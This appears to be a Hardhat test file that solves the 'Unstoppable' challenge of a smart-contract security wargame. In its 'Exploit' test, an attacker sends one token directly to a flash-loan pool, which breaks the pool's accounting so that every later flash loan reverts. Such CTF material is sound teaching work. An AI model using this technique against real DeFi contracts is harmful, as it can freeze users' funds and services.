import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";

describe("Unstoppable Test", function () {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    let someUser: SignerWithAddress;
    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
    
  async function setupFixture() {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attacker, someUser] = await ethers.getSigners();

    const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
    const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

    const token = await DamnValuableTokenFactory.deploy();
    const pool = await UnstoppableLenderFactory.deploy(token.address);

    await token.approve(pool.address, TOKENS_IN_POOL);
    await pool.depositTokens(TOKENS_IN_POOL);

    await token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

     // Show it's possible for someUser to take out a flash loan
     const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
     const receiverContract = await ReceiverContractFactory.deploy(pool.address);
     await receiverContract.executeFlashLoan(10);

     return {token, receiverContract, pool}
  }
    it("Deployment", async function () {
      const {token, receiverContract, pool} = await loadFixture(setupFixture);

      expect(
        await token.balanceOf(pool.address)
    ).to.equal(TOKENS_IN_POOL);

    expect(
        await token.balanceOf(attacker.address)
    ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
    });

    it("Exploit", async function () {
      const {token, receiverContract, pool} = await loadFixture(setupFixture);
      /** EXPLOIT */
      await token.connect(attacker).transfer(pool.address, 1);
      /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
          receiverContract.executeFlashLoan(10)
      ).to.be.reverted;
    });
  });
